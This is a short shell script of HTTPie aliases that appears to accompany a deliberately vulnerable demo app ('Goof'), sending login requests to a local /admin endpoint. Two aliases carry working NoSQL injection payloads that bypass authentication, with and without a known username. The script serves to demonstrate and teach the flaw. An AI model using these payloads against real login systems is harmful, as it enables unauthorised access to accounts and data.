
if [ -z "$GOOF_HOST" ]; then
	export GOOF_HOST=http://localhost:3001
fi

# Default working case - form fill
alias ns1="echo -n 'username=admin&password=SuperSecretPassword' | http --form $GOOF_HOST/admin -v"

# JSON working login
alias ns2='echo '"'"'{"username":"admin", "password":"SuperSecretPassword"}'"'"' | http --json $GOOF_HOST/admin -v'

# failed login
alias ns3='echo '"'"'{"username":"admin", "password":"WrongPassword"}'"'"' | http --json $GOOF_HOST/admin -v'

# successful login, NOSQL Injection, knowing the username
alias ns4='echo '"'"'{"username": "admin", "password": {"$gt": ""}}'"'"' | http --json $GOOF_HOST/admin -v'

# successful login, NOSQL Injection, without knowing the username
alias ns5='echo '"'"'{"username": {"$gt": ""}, "password": {"$gt": ""}}'"'"' | http --json $GOOF_HOST/admin -v'

